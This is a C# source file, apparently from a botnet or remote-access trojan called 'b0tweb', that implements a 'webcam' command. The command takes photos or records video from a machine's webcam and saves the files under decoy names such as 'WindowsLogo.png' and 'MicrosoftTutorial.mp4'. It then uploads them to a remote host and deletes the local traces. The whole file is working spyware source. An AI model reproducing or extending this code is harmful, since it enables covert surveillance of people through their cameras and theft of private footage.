using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Emgu.CV;
using System.Drawing;

namespace b0tweb.Commands
{
    class WebcamControlCommand : AbstractCommand
    {
        public override string Command => "webcam";

        protected override string ExecuteCommand(string[] args)
        {
            if (args.Length == 0 || args[0].Equals("picture"))
            {
                return UploadImageCapture();
            }
            else if (args[0].Equals("capture"))
            {
                if (args.Length == 2) // number of seconds supplied
                {
                    return UploadVideoCapture(Int16.Parse(args[1]));
                }

                return UploadVideoCapture(5); // record default of 5 seconds
            }

            return "Invalid arguments for the webcam command specified";
        }

        /// <summary>
        /// Captures image from a webcam using EmguCV and uploads it.
        /// </summary>
        /// <returns>url to the png of the capture</returns>
        private string UploadImageCapture()
        {
            string path = FileHelper.GetTemporaryFilePath("WindowsLogo.png");

            Capture capture = new Capture();
            Bitmap image = capture.QueryFrame().Bitmap;

            image.Save(path);

            capture.Dispose();

            string url = HTTPHelper.Upload(path);
            FileHelper.DeleteFile(path);

            return url;

        }

        /// <summary>
        /// Records a video using Emgu through the webcam and uploads it
        /// </summary>
        /// <param name="seconds">how many seconds to record for</param>
        /// <returns>url to the video file</returns>
        private string UploadVideoCapture(int seconds)
        {
            string path = FileHelper.GetTemporaryFilePath("MicrosoftTutorial.mp4");

            VideoWriter writer = new VideoWriter(path, VideoWriter.Fourcc('M', 'P', '4', 'V'), 10, new Size(640, 480), true);
               
            // keep track of time during recording
            DateTime start = DateTime.Now;
            DateTime future;

            Capture capture = new Capture();

            do {
                future = DateTime.Now;

                // write the frame
                writer.Write(capture.QueryFrame());

            } while (DateTime.Compare(start.AddSeconds(seconds), future) > 0);

            // close the webcam connection
            writer.Dispose();
            capture.Dispose();

            string url = HTTPHelper.Upload(path);

            FileHelper.DeleteFile(path);

            return url;
        }
    }
}
